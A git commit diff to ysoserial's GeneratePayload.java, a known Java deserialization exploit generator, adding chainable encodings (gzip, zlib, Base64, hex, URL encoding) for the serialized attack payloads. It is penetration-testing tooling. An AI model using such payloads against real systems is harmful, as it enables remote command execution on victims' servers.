4e1d2d105f2566bcbf2b81ae2e92e891640a4255
Federico Dotta <dottafederico@gmail.com>
2018-10-26 12:21:52 +0200

    Added payload transformations

--- src/main/java/ysoserial/GeneratePayload.java
+++ src/main/java/ysoserial/GeneratePayload.java
@@ -1,7 +1,16 @@
 package ysoserial;
 
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.OutputStream;
 import java.io.PrintStream;
+import java.net.URLEncoder;
 import java.util.*;
+import java.util.zip.DeflaterOutputStream;
+import java.util.zip.GZIPOutputStream;
+
+import org.apache.commons.codec.binary.Base64;
+import org.apache.commons.codec.binary.Hex;
 
 import ysoserial.payloads.ObjectPayload;
 import ysoserial.payloads.ObjectPayload.Utils;
@@ -25,6 +34,11 @@ public class GeneratePayload {
 			attackType = args[2];
 		}
 		
+		String[] payloadTransformations = null;
+		if (args.length >= 4) {
+			payloadTransformations = args[3].split(",");
+		}
+		
 		final String payloadType = args[0];
 		final String command = args[1];
 
@@ -40,7 +54,24 @@ public class GeneratePayload {
 			final ObjectPayload payload = payloadClass.newInstance();
 			final Object object = payload.getObject(command, attackType);
 			PrintStream out = System.out;
-			Serializer.serialize(object, out);
+			
+			byte[] serializedObjectBytes = Serializer.serialize(object);
+			
+			byte[] transformedObjectBytes = serializedObjectBytes;
+			if(payloadTransformations != null) {
+			
+				for(String s : payloadTransformations) {
+				
+					transformedObjectBytes = Transformation.valueOf(s.toUpperCase().trim()).transform(transformedObjectBytes);
+										
+				}
+			
+			}
+									
+			out.write(transformedObjectBytes);
+			out.flush();
+			out.close();
+			
 			ObjectPayload.Utils.releasePayload(payload, object);
 		} catch (Throwable e) {
 			System.err.println("Error while generating or serializing payload");
@@ -83,4 +114,48 @@ public class GeneratePayload {
 		System.err.println("\t\tsleep");
 		System.err.println("\t\tdns");
     }
+	
+    private enum Transformation {
+        GZIP {
+            public String toString() { return "Compress using gzip"; }
+            protected OutputStream getCompressor(OutputStream os) throws IOException {
+                return new GZIPOutputStream(os);
+            }
+        },
+        ZLIB {
+            public String toString() { return "Compress using zlib"; }
+            protected OutputStream getCompressor(OutputStream os) throws IOException {
+                return new DeflaterOutputStream(os);
+            }
+        },
+        BASE64 {
+            public String toString() { return "Encode using Base64"; }
+            public byte[] transform(byte[] input) throws IOException { return Base64.encodeBase64(input); }
+        },
+        BASE64_URL_SAFE {
+            public String toString() { return "Encode using URL-safe Base64"; }
+            public byte[] transform(byte[] input) throws IOException { return Base64.encodeBase64URLSafe(input); }
+        },
+        ASCII_HEX {
+            public String toString() { return "Encode using ASCII hex"; }
+            public byte[] transform(byte[] input) throws IOException { return hex.encode(input); }
+			private Hex hex = new Hex("ASCII");
+        },
+        URL_ENCODING {
+            public String toString() { return "Encode using URL encoding"; }
+            public byte[] transform(byte[] input) throws IOException {
+                return URLEncoder.encode(new String(input, "ISO-8859-1"), "ISO-8859-1").getBytes();
+            }
+        };
+
+        protected OutputStream getCompressor(OutputStream os) throws IOException { return null; }
+        public byte[] transform(byte[] input) throws IOException {
+            ByteArrayOutputStream outbytes = new ByteArrayOutputStream(input.length);
+            OutputStream comp = getCompressor(outbytes);
+            comp.write(input);
+            comp.close();
+            return outbytes.toByteArray();
+        }
+    }
+    
 }
